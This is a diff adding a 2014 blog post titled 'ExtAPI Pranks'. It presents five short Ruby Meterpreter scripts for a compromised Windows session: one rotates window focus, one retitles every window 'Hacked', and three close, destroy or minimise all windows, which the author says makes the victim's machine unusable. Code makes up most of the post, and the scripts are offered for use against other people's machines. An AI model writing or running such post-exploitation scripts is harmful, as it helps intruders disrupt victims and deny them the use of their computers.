@@ -1,0 +1,72 @@
+---
+layout: post
+title: "ExtAPI Pranks"
+date: 2014-01-10 01:21:45 -0500
+comments: true
+categories: 
+---
+
+Since I've been gone, OJ has released the ExtAPI (Extended API) for Meterpreter. This has some pretty amazing functionality. You can find [OJ](https://twitter.com/TheColonial)'s write up on it and more amazing things he did in [3 months of meterpreter](http://buffered.io/posts/3-months-of-meterpreter/) and on the [Metasploit blog](https://community.rapid7.com/community/metasploit/blog/2013/12/12/weekly-metasploit-update).
+
+Just brushing the surface and to help people see the power of this new functionality I went ahead and created a few Meterpreter scripts that can really mess with someone.
+
+1st is a script that loops through all of the windows for your current user and sets the focus to them in rotation. Essentially making their machine unusable.
+
+* Source: https://gist.github.com/mubix/8050500
+```ruby
+# Code loops around each of the windows
+# that the current user has open and switches
+# focus to each of them in rotation... 100 times.
+ 
+(0..100).each do |x|
+	windows = client.extapi.window.enumerate
+	windows.each do |winder|
+		if winder[:title] != 'Default IME'
+			result = client.railgun.user32.SetForegroundWindow(winder[:handle])
+		end
+	end
+	print_status("Round #{x}")
+end
+```
+
+2nd just sets all of the windows title's the say "hacked"
+
+* Source: https://gist.github.com/mubix/8050592
+```ruby
+windows = client.extapi.window.enumerate
+windows.each do |winder|
+  if winder[:title] != 'Default IME'
+    result = client.railgun.user32.SetWindowTextA(winder[:handle],"Hacked")
+  end
+end
+```
+
+and finally if in Windows if you close all of the windows, including "invisible" ones like Explorer, you will essentially make the machine unusable.
+
+* Source: https://gist.github.com/mubix/8050653
+```ruby
+windows = client.extapi.window.enumerate
+windows.each do |winder|
+	result = client.railgun.user32.CloseWindow(winder[:handle])
+end
+```
+
+OJ suggested a few other options:
+
+Destroy:
+```ruby
+windows = client.extapi.window.enumerate
+windows.each do |winder|
+    result = client.railgun.user32.DestroyWindow(winder[:handle])
+end
+```
+
+or Minimize all:
+```ruby
+windows = client.extapi.window.enumerate
+windows.each do |winder|
+    result = client.railgun.user32.ShowWindow(winder[:handle], 6)
+end
+```
+
+Thats it for now, next up we will do a few things with services as well as the clipboard. Stay tuned!
